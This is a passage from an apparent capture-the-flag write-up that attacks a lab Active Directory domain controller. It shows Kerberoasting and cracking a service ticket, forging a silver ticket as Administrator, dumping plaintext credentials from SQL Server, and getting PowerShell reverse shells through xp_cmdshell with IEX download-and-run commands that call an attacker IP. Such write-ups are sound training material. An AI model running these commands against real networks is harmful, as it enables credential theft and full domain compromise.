</span></span><span style="display:flex;"><span>ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
</span></span><span style="display:flex;"><span>----------------------------  ------  --------  --------------------------  --------------------------  ----------
</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             </span></span></code></pre></div>
<ul>
<li>Notice the use of <em>dc1.scrm.local</em> using the flag <em>-dc-host</em> and not the <em>ip address</em> like <em>-dc-host 10.10.11.168</em> which will give an error.</li>
</ul>
<h3 id="requesting-ticket">Requesting Ticket</h3>
<p>It appears that we can do <a href="https://youtu.be/xH5T9-m9QXw"><em>kerberosting attack</em></a> against <em>MSSQLSvc</em>, so let&rsquo;s append the <em>-request</em> to the previous command to get the encrypted ticket for this service.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/GetUserSPNs.py -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -no-pass -target-domain scrm.local -request
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
</span></span><span style="display:flex;"><span>----------------------------  ------  --------  --------------------------  --------------------------  ----------
</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0</span></span></code></pre></div></p>
<h3 id="cracking-ticket-using-hashcat">Cracking Ticket Using Hashcat</h3>
<p>And now we try to crack this ticket using hachcat and rockyou.txt</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">13100</span> <span style="color:#e6db74">&#39;$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0&#39;</span> /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0:Pegasus60
</span></span><span style="display:flex;"><span>    ...</span></span></code></pre></div>
<h2 id="silver-ticket-attack">Silver Ticket Attack</h2>
<p>The password for this SQL service is <em>Pegasus60</em>, so I can now use a <a href="https://youtu.be/_nJ-b1UFDVM"><em>Silver Ticket Attack</em></a> against this service and pretend to be the Administrator.</p>
<ul>
<li>
<p>First, I need to get the <em>NTLM hash</em> for this password which is required by <em>impacket-ticketer.py</em> script. We can do that using an online NTLM hash generator like <a href="https://tobtu.com/lmntlm.php"><em>tobtu</em></a> for example.
<img src="generating-ntlm-hash-for-silver-ticket-attack.png" alt="NTLM Hash generation for Silver Ticket Attack"></p>
</li>
<li>
<p>Next, I need to get the SID of the domain. There are plenty of ways, using <em>LDAP</em> for example, but the simplest one is to use <em>impacket-secrectsdump.py</em> with the <em>-debug</em> option since we are on linux.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/secretsdump.py scrm.local/ksimpson:ksimpson@dc1.scrm.local -k -no-pass -debug
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calling DRSCrackNames <span style="color:#66d9ef">for</span> S-1-5-21-2743207045-1827831105-2542523200-500 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calling DRSGetNCChanges <span style="color:#66d9ef">for</span> <span style="color:#f92672">{</span>edaf791f-e75b-4711-8232-3cd66840032a<span style="color:#f92672">}</span> 
</span></span><span style="display:flex;"><span>    Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>        File <span style="color:#e6db74">&#34;/opt/impacket/build/scripts-3.10/secretsdump.py&#34;</span>, line 230, in dump
</span></span><span style="display:flex;"><span>            self.__NTDSHashes.dump<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    ...</span></span></code></pre></div>
It does not really matter if we get an error, the important thing is that we got the domain SID <em>S-1-5-21-2743207045-1827831105-2542523200</em> (without <em>-500</em> which is the RID)</p>
</li>
<li>
<p>Finally, we can request a <em>Silver Ticket</em> using <em>impacket-ticketer.py</em>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -user ksimpson -password ksimpson Administrator
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating basic skeleton ticket and PAC Infos
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Customizing ticket <span style="color:#66d9ef">for</span> scrm.local/Administrator
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_LOGON_INFO
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_CLIENT_INFO_TYPE
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncAsRepPart
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Signing/Encrypting final ticket
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_SERVER_CHECKSUM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_PRIVSVR_CHECKSUM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncASRepPart
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator.ccache</span></span></code></pre></div></p>
</li>
</ul>
<h2 id="interacting-with-sql-server-as-administrator">Interacting with SQL Server As Administrator</h2>
<p>Now we can export the ticket like we did before, and interact with the SQL service pretending to be the Administrator.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span>Administrator.ccache
</span></span><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/mssqlclient.py scrm.local -k -no-pass
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
</span></span><span style="display:flex;"><span>SQL&gt; </span></span></code></pre></div></p>
<h3 id="enumerating-the-database">Enumerating the Database</h3>
<p>Let&rsquo;s enumerate databases looking for some credentials
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; SELECT name FROM master.dbo.sysdatabases
</span></span><span style="display:flex;"><span>name                                                                                                                               
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------------------------   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>master                                                                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tempdb                                                                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model                                                                                                                              
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msdb                                                                                                                               
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ScrambleHR                                                                                                                         
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQL&gt; use ScrambleHR;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: ScrambleHR
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;ScrambleHR&#39;</span>.
</span></span><span style="display:flex;"><span>SQL&gt; SELECT  * FROM INFORMATION_SCHEMA.TABLES;
</span></span><span style="display:flex;"><span>TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME     TABLE_TYPE   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-------------   --------------   -----------   ------------   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ScrambleHR          dbo           Employees     b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ScrambleHR          dbo           UserImport    b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ScrambleHR          dbo           Timesheets    b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQL&gt; <span style="color:#66d9ef">select</span> * from UserImport;
</span></span><span style="display:flex;"><span>LdapUser     LdapPwd                  LdapDomain     RefreshInterval   IncludeGroups   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---------   ---------------------   --------------   ---------------   -------------   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MiscSvc      ScrambledEggs9900       scrm.local          <span style="color:#ae81ff">90</span>                  <span style="color:#ae81ff">0</span>   </span></span></code></pre></div></p>
<p>Looks like we got new Creds <em>MiscSvc:ScrambledEggs9900</em></p>
<h3 id="getting-reverse-via-xp_cmdshell">Getting Reverse via xp_cmdshell</h3>
<p>Since we have Administrative privileges on the SQL service, we can try to enable <em>xp_cmdshell</em> and then execute commands that way. The process is very simple using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py"><em>impacket-mssqlclient.py</em></a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; enable_xp_cmdshell
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span style="display:flex;"><span>SQL&gt; xp_cmdshell whoami
</span></span><span style="display:flex;"><span>output                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\s</span>qlsvc                                                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NULL                                                                               </span></span></code></pre></div></p>
<p>Since I have credentials for <em>MiscSvc</em>, a simple way to escalate to that user from this, is via powershell by creating a <em>New PSCredential Object</em>, but I need first to get a <em>proper shell</em>. I&rsquo;ll use <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"><em>Invoke-PowerShellTcp.ps1</em></a> from <a href="https://github.com/samratashok/nishang"><em>Nishang</em></a> project.</p>
<ul>
<li>
<p>First, I&rsquo;ll copy <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"><em>Invoke-PowerShellTcp.ps1</em></a> to my current directory and append at the end of this script the following line
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.59 -Port <span style="color:#ae81ff">8989</span></span></span></code></pre></div></p>
</li>
<li>
<p>Next, I&rsquo;ll open a webserver on port 8000, and listen for reverse shell connection on port 8989
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...</span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8989</span> ...</span></span></code></pre></div></p>
</li>
<li>
<p>Then, I&rsquo;ll use <em>powershell IEX</em> expression to load the script directly into RAM from my server without installing anything or touching the disk
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; xp_cmdshell <span style="color:#e6db74">&#34;powershell IEX (New-Object Net.WebClient).DownloadString(\&#34;http://10.10.16.59:8000/Invoke-PowerShellTcp.ps1\&#34;);&#34;</span></span></span></code></pre></div>
<img src="getting-reverse-shell-as-sqlsvc.png" alt="Getting Reverse Shell as sqlvc"></p>
</li>
</ul>
<h3 id="switching-to-miscsvc-user-and-getting-usertxt">Switching to MiscSvc User and Getting user.txt</h3>
<p>In order to switch to <em>MiscSvc</em> user I&rsquo;ll use <em>New PSCredential Object</em> and <em>Invoke-Command</em> which are built in command from powershell
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; $pass <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;ScrambledEggs9900&#34;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; $cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;scrm.local\MiscSvc&#34;</span>, $pass<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; Invoke-Command -ComputerName dc1.scrm.local -Credential $cred <span style="color:#f92672">{</span>whoami<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\m</span>iscsvc</span></span></code></pre></div></p>
<p>Now I am able to execute commands as <em>MiscSvc</em>, so I&rsquo;ll get another reverse shell as that user using the same technique, but I need to change the port number in the last line of <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"><em>Invoke-PowerShellTcp.ps1</em></a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.59 -Port <span style="color:#ae81ff">8990</span></span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-Command -ComputerName dc1.scrm.local -Credential $cred <span style="color:#f92672">{</span>IEX <span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://10.10.16.59:8000/Invoke-PowerShellTcp.ps1&#34;</span><span style="color:#f92672">)}</span></span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8990</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8990</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.59<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.168<span style="color:#f92672">]</span> <span style="color:#ae81ff">49552</span>
</span></span><span style="display:flex;"><span>Windows PowerShell running as user miscsvc on DC1
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\D</span>ocuments&gt;whoami
</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\m</span>iscsvc
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\D</span>ocuments&gt; cat ..<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt       
</span></span><span style="display:flex;"><span>39d**************************399</span></span></code></pre></div></p>
<ul>
<li>Notice here I used <em>IEX</em> expression directly without <em>powershell</em> command before it, otherwise it will throw an error because <em>Invoke-Command</em> already uses powershell as interpreter not cmd.</li>
</ul>
<h2 id="post-enumeration">Post Enumeration</h2>
